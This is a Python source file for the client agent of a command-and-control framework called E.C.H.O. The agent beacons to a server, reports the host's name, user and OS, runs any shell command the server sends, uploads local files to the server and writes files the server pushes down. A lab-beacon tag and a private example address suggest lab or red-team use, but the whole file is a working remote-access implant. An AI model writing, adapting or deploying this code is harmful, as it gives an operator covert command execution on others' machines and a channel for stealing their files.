# client/client.py
import requests
import time
import argparse
import subprocess
import sys
import platform
import json
import os
import urllib3
import base64
import colorama

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init(autoreset=True)

class bcolors:
    HEADER = '\033[95m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

VERSION = "v0.1.0"

def mask_token(tok, head=6, tail=4):
    if not tok:
        return "<none>"
    if len(tok) <= head + tail + 3:
        return tok
    return tok[:head] + "..." + tok[-tail:]

def print_startup_banner(server_url, token):
    # Clear line and print banner
    banner_lines = [
        f"{bcolors.BOLD}{bcolors.OKCYAN}╔═════════════════════════════════════════════════════════════╗{bcolors.ENDC}",
        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.BOLD}{bcolors.HEADER}E.C.H.O{bcolors.ENDC} - Endpoint Command & Host Operations",
        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.OKGREEN}Agent starting{bcolors.ENDC}    Version: {bcolors.BOLD}{VERSION}{bcolors.ENDC}",
        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.OKCYAN}Server: {server_url}{bcolors.ENDC}",
        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.OKCYAN}Auth token: {mask_token(token)}{bcolors.ENDC}",
        f"{bcolors.BOLD}{bcolors.OKCYAN}║{bcolors.ENDC} {bcolors.WARNING}Waiting for commands... (beacon interval active){bcolors.ENDC}",
        f"{bcolors.BOLD}{bcolors.OKCYAN}╚═════════════════════════════════════════════════════════════╝{bcolors.ENDC}",
    ]
    print("\n".join(banner_lines))

def gather_info():
    return {
        "hostname": platform.node(),
        "username": os.getlogin() if hasattr(os, "getlogin") else "unknown",
        "os": platform.platform(),
    }

def exec_command(full_cmd):
    try:
        _,cmd = full_cmd.split(" ",1)
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return {"stdout": proc.stdout, "stderr": proc.stderr, "returncode": proc.returncode}
    except Exception as e:
        return {"error": str(e)}

def download_file(server_url, cert, agent_id, filepath, auth_token, dest_path=None):
    """
    Upload a local file from the agent to the C2 server.
    Supports optional remote destination header via command syntax: DOWNLOAD <src> <dest>
    """
    result = {"stdout": "", "stderr": ""}
    if not os.path.isfile(filepath):
        msg = f"File not found: {filepath}"
        print(f"{bcolors.FAIL}[!] {msg}")
        result["stderr"] = msg
        return result

    headers = {"X-Auth-Token": auth_token} if auth_token else {}
    if dest_path:
        headers["X-Dest-Path"] = dest_path

    try:
        with open(filepath, "rb") as f:
            files = {"file": f}
            r = requests.post(f"{server_url}/upload/{agent_id}", headers=headers, files=files, verify=cert, timeout=30)

        if r.status_code == 200:
            msg = f"Uploaded successfully: {filepath} → {dest_path or 'uploads/'}"
            print(f"{bcolors.OKGREEN}[+] {msg}")
            result["stdout"] = msg
        else:
            msg = f"Upload failed ({r.status_code}): {r.text}"
            print(f"{bcolors.WARNING}[!] {msg}")
            result["stderr"] = msg

    except Exception as e:
        msg = f"Upload error: {e}"
        print(f"{bcolors.FAIL}[!] {msg}")
        result["stderr"] = msg

    return result

def handle_upload_command(command):
    """
    Upload a remote file to the agent
    """
    parts = command.split(" ", 2)
    if len(parts) != 3:
        return {"error": "UPLOAD command malformed. Expected: UPLOAD <remote_path> <b64_content>"}
    _, remote_path, b64_content = parts
    try:
        data = base64.b64decode(b64_content)
        dir_path = os.path.dirname(remote_path)
        if dir_path and not os.path.exists(dir_path):
            os.makedirs(dir_path, exist_ok=True)
        with open(remote_path, "wb") as f:
            f.write(data)
        return {"stdout": f"File written to {remote_path}", "stderr": "", "returncode": 0}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": 1}

def handle_task(server_url, cert, agent_id, auth_token, task):
    command = task.get("command")
    print(f"{bcolors.OKGREEN}[+] Received task: {command}")
    if command.startswith("DOWNLOAD "):
        parts = command.split(" ", 2)
        src_path = parts[1].strip()
        dest_path = parts[2].strip() if len(parts) > 2 else None
        download_result = download_file(server_url, cert, agent_id, src_path, auth_token, dest_path)
        result = {
            "command": command,
            "source": src_path,
            "destination": dest_path or "uploads/",
            "stdout": download_result.get("stdout", ""),
            "stderr": download_result.get("stderr", ""),
            "status": "completed" if not download_result.get("stderr") else "error"
        }
    elif command.startswith("UPLOAD "):
        result = handle_upload_command(command)
    else:
        result = exec_command(command)
    return command, result

def send_result(server_url, cert, headers_base, agent_id, command, cmd_id, result):
    result_payload = {
        "agent_id": agent_id,
        "command": command,
        "cmd_id": cmd_id,
        "result": result
    }
    try:
        r2 = requests.post(f"{server_url}/results", json=result_payload, headers=headers_base, verify=cert, timeout=15)
        if r2.status_code != 200:
            print(f"{bcolors.WARNING}[!] Server responded {r2.status_code}: {r2.text}")
    except Exception as e:
        print(f"{bcolors.FAIL}[!] Failed to send result: {e}")

def beacon_cycle(server_url, cert, agent_id=None, interval=10, auth_token=None):
    headers_base = {"User-Agent": "ECHO-Agent/1.0"}
    if auth_token:
        headers_base["X-Auth-Token"] = auth_token

    while True:
        payload = {
            "agent_id": agent_id,
            "hostname": gather_info().get("hostname"),
            "username": gather_info().get("username"),
            "os": gather_info().get("os"),
            "extra": {"note": "lab-beacon"}
        }
        try:
            r = requests.post(f"{server_url}/beacon", json=payload, headers=headers_base, verify=cert, timeout=15)
            j = r.json()
        except Exception as e:
            print(f"{bcolors.FAIL}[!] Beacon failed: {e}")
            time.sleep(interval)
            continue

        if not agent_id and j.get("agent_id"):
            agent_id = j["agent_id"]
            print(f"{bcolors.HEADER}[+] Assigned agent_id: {agent_id}{bcolors.ENDC}")

        task = j.get("task")
        if task:
            command, result = handle_task(server_url, cert, agent_id, auth_token, task)
            send_result(server_url, cert, headers_base, agent_id, command, task.get("cmd_id"), result)

        time.sleep(interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="E.C.H.O: Endpoint Command & Host Operations (client agent)")
    parser.add_argument("--server", required=True, help="C2 server URL (ex: https://10.0.2.15:8443)")
    parser.add_argument("--cert", required=True, help="path to the client certificate (ca.crt)")
    parser.add_argument("--interval", type=int, default=10, help="beacon interval in seconds")
    parser.add_argument("--token",required=True,type=str, default=None, help="X-Auth-Token (optional: also read from env ECHO_AUTH_TOKEN)")
    args = parser.parse_args()

    token = args.token or os.environ.get("ECHO_AUTH_TOKEN")
    print_startup_banner(args.server, token)

    beacon_cycle(args.server, args.cert, agent_id=None, interval=args.interval, auth_token=token)
